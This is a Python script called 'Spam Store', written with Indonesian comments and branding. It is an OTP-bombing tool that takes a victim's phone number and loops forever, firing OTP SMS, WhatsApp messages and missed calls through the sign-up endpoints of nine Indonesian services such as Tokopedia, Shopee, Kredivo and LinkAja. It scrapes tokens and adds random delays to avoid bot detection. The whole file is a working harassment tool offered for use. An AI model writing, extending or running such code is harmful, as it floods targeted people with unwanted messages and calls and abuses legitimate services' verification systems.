#!/usr/bin/env python3
# 🧸 Spam Store — By Adrianzz (14 tahun, jago ngoding! Hehe)
# Spam OTP brutal ke semua platform, auto-loop tiap 2 menit, stop pake Ctrl+C

import os, sys, time, random, requests, json, re, threading
from colorama import Fore, Style, init
init(autoreset=True)

# ---------- WARNA LUCU ----------
C = Fore.CYAN
G = Fore.GREEN
R = Fore.RED
Y = Fore.YELLOW
M = Fore.MAGENTA
W = Fore.WHITE
B = Fore.BLUE
D = Style.RESET_ALL

# ---------- KONFIGURASI ----------
TARGET_NUMBER = ""  # Diisi nanti
COOLDOWN = 120      # 2 menit setelah satu ronde selesai
ROUND_COUNT = 0
STOP_FLAG = False

# ---------- TOKO SPAM (DAFTAR PLATFORM) ----------
# Format: (Nama Platform, Fungsi Spam)
PLATFORMS = []

def register_platform(name):
    """Decorator untuk daftarin platform ke toko"""
    def decorator(func):
        PLATFORMS.append((name, func))
        return func
    return decorator

# ==================== MESIN SPAM ====================
HEADERS_MOBILE = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36'
}

# --- Tokopedia (WA) ---
@register_platform("Tokopedia (WA)")
def spam_tokopedia(no):
    try:
        headers = HEADERS_MOBILE.copy()
        headers.update({
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Origin': 'https://accounts.tokopedia.com',
            'X-Requested-With': 'XMLHttpRequest',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
        })
        # Dapetin token
        reg = requests.get(
            f'https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn=0{no}&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D0{no}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D',
            headers=headers, timeout=10
        ).text
        token = re.search(r'<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', reg).group(1)
        payload = {
            "otp_type": "116",
            "msisdn": f"0{no}",
            "tk": token,
            "email": '',
            "original_param": "",
            "user_id": "",
            "signature": "",
            "number_otp_digit": "6"
        }
        resp = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers=headers, data=payload, timeout=10).text
        if 'Anda sudah melakukan 3 kali' in resp:
            return False, "Limit (3x)"
        return True, "Terkirim"
    except Exception as e:
        return False, str(e)[:30]

# --- Shopee (SMS) ---
@register_platform("Shopee (SMS)")
def spam_shopee(no):
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'Origin': 'https://shopee.co.id',
            'Referer': 'https://shopee.co.id/'
        }
        data = {"phone": f"0{no}", "type": "register", "channel": "sms"}
        resp = requests.post('https://mall.shopee.co.id/api/v2/otp/send', headers=headers, json=data, timeout=10)
        if resp.status_code == 200 and json.loads(resp.text).get('success'):
            return True, "Terkirim"
        return False, "CORS Diblokir"
    except Exception as e:
        return False, str(e)[:30]

# --- Alfagift (WA/SMS) ---
@register_platform("Alfagift (WA)")
def spam_alfagift(no):
    try:
        headers = HEADERS_MOBILE.copy()
        resp = requests.post(
            'https://alfagift.id/api/v1/otp/request',
            json={"phone": f"0{no}", "type": "register"},
            headers=headers,
            timeout=10
        )
        if resp.status_code == 200 and 'berhasil' in resp.text.lower():
            return True, "Terkirim"
        return False, "Gagal/limit"
    except Exception as e:
        return False, str(e)[:30]

# --- Dunia Games (Telkomsel only) ---
@register_platform("DuniaGames (SMS)")
def spam_duniagames(no):
    try:
        headers = {
            'Host': 'api.duniagames.co.id',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 9; SM-T825Y) AppleWebKit/537.36',
            'Content-Type': 'application/json',
            'Origin': 'https://duniagames.co.id',
            'Referer': 'https://duniagames.co.id/'
        }
        data = {"phoneNumber": f"0{no}", "inquiryId": "219424679"}
        resp = requests.post('https://api.duniagames.co.id/api/transaction/v1/top-up/transaction/req-otp/', headers=headers, json=data, timeout=10).text
        if 'Field ini harus diisi dengan nomor Telkomsel' in resp:
            return False, "Harus Telkomsel"
        if 'Maaf' in resp:
            return False, "Limit/konfirmasi"
        return True, "Terkirim"
    except Exception as e:
        return False, str(e)[:30]

# --- Jagreward (Call) ---
@register_platform("Jagreward (Call)")
def spam_jagreward(no):
    try:
        resp = requests.get(f"https://id.jagreward.com/member/verify-mobile/0{no}", timeout=10)
        if 'Anda akan menerima sebuah panggilan' in resp.text:
            return True, "Panggilan masuk"
        return False, "Limit/gagal"
    except Exception as e:
        return False, str(e)[:30]

# --- Nutriclub (Call) ---
@register_platform("Nutriclub (Call)")
def spam_nutriclub(no):
    try:
        resp = requests.post(
            f"https://www.nutriclub.co.id/otp/?phone=0{no}&old_phone=0{no}",
            headers={'User-Agent': 'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36'},
            timeout=10
        )
        if json.loads(resp.text).get("StatusMessage") == 'Request misscall berhasil':
            return True, "Misscall masuk"
        return False, "Gagal/limit"
    except Exception as e:
        return False, str(e)[:30]

# --- JD.ID (SMS) ---
@register_platform("JD.ID (SMS)")
def spam_jdid(no):
    try:
        headers = HEADERS_MOBILE.copy()
        resp = requests.post(
            'https://m.jd.id/api/sendOtp',
            json={"phoneNum": f"0{no}"},
            headers=headers,
            timeout=10
        )
        if resp.status_code == 200 and 'success' in resp.text.lower():
            return True, "Terkirim"
        return False, "Gagal/limit"
    except Exception as e:
        return False, str(e)[:30]

# --- Kredivo (WA) ---
@register_platform("Kredivo (WA)")
def spam_kredivo(no):
    try:
        headers = HEADERS_MOBILE.copy()
        resp = requests.post(
            'https://api.kredivo.com/api/v2/user/otp/send',
            json={"phone": f"0{no}", "purpose": "register"},
            headers=headers,
            timeout=10
        )
        if resp.status_code == 200:
            return True, "Terkirim"
        return False, "Gagal/limit"
    except Exception as e:
        return False, str(e)[:30]

# --- LinkAja (SMS) ---
@register_platform("LinkAja (SMS)")
def spam_linkaja(no):
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
            'Content-Type': 'application/json'
        }
        resp = requests.post(
            'https://gateway.linkaja.com/api/v1/otp/send',
            json={"msisdn": f"0{no}"},
            headers=headers,
            timeout=10
        )
        if resp.status_code == 200:
            return True, "Terkirim"
        return False, "Gagal/limit"
    except Exception as e:
        return False, str(e)[:30]

# ==================== FUNGSI UTAMA ====================
def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
{Y}╔═══════════════════════════════════════════════╗
║   🧸 {G}SPAM STORE 🧸{Y}                             ║
║   {C}By Adrianzz (Umur 14 Tahun, Jago Ngoding!)    {Y}║
║   {M}Spam OTP Brutal ke Semua Platform!            {Y}║
╚═══════════════════════════════════════════════╝{D}
    """)

def show_progress(current, total, platform_name, status, detail=""):
    """Progress bar lucu per platform"""
    bar_len = 25
    filled = int(bar_len * current // total)
    bar = '█' * filled + '░' * (bar_len - filled)
    color = G if status else R
    symbol = "✅" if status else "❌"
    print(f"{C}[{current}/{total}]{D} {bar} {Y}{platform_name:<20} {color}{symbol} {detail}{D}")

def spam_round(no):
    """Satu ronde spam ke semua platform"""
    global ROUND_COUNT
    ROUND_COUNT += 1
    total = len(PLATFORMS)
    success = 0
    print(f"\n{M}🔥 RONDE KE-{ROUND_COUNT} DIMULAI! Target: {W}0{no}{D}\n")
    
    results = []
    for i, (name, func) in enumerate(PLATFORMS, 1):
        if STOP_FLAG:
            break
        ok, msg = func(no)
        if ok:
            success += 1
        results.append((name, ok, msg))
        show_progress(i, total, name, ok, msg)
        # Jeda random biar gak dianggap bot
        time.sleep(random.uniform(1.5, 4.0))
    
    print(f"\n{G}✨ Ronde {ROUND_COUNT} selesai! {success}/{total} platform berhasil dikirim.{D}")
    print(f"{Y}⏳ Cooldown 2 menit sebelum ronde berikutnya... (Ctrl+C untuk berhenti){D}")
    return success

def countdown(t):
    """Hitung mundur dengan progress bar"""
    for i in range(t, 0, -1):
        if STOP_FLAG:
            break
        mins, secs = divmod(i, 60)
        sys.stdout.write(f"\r{Y}🕒 Istirahat: {mins:02d}:{secs:02d} tersisa... {D}")
        sys.stdout.flush()
        time.sleep(1)
    print("\r" + " "*50 + "\r", end="")

def main():
    global TARGET_NUMBER, STOP_FLAG
    banner()
    
    # Input nomor target
    TARGET_NUMBER = input(f"{C}🎯 Masukkan nomor target (contoh: 81234567890): 0{W}").strip()
    if not TARGET_NUMBER.isdigit():
        print(f"{R}Nomor harus angka! Keluar...{D}")
        sys.exit(1)
    
    print(f"\n{G}🧸 Spam Store siap! {len(PLATFORMS)} platform siap tempur!{D}")
    print(f"{M}Target: 0{TARGET_NUMBER}{D}")
    print(f"{Y}Setiap ronde spam ke {len(PLATFORMS)} platform, cooldown 2 menit, auto-loop.{D}")
    print(f"{Y}Tekan Ctrl+C kapan aja buat berhenti.{D}\n")
    time.sleep(2)
    
    # Loop utama
    try:
        while not STOP_FLAG:
            spam_round(TARGET_NUMBER)
            if STOP_FLAG:
                break
            countdown(COOLDOWN)
    except KeyboardInterrupt:
        STOP_FLAG = True
        print(f"\n\n{R}🛑 Dihentikan oleh user yang ganteng dan cantik 😝 (Ctrl+C).{D}")
    
    print(f"\n{G}🧸 Spam Store ditutup. Sampai jumpa! Total ronde: {ROUND_COUNT}{D}\n")
    print(f"{C}By Adrianzz — Jangan lupa paket lengkap dulu dongg{D}")
    print(f"YouTube : @adrianzz324\n"+"Tiktok : @adrianzz324\n"+"Github : Adrianzz324\n")
    print("Pokoknya Adrianzz324 lah teman teman")

if __name__ == "__main__":
    main()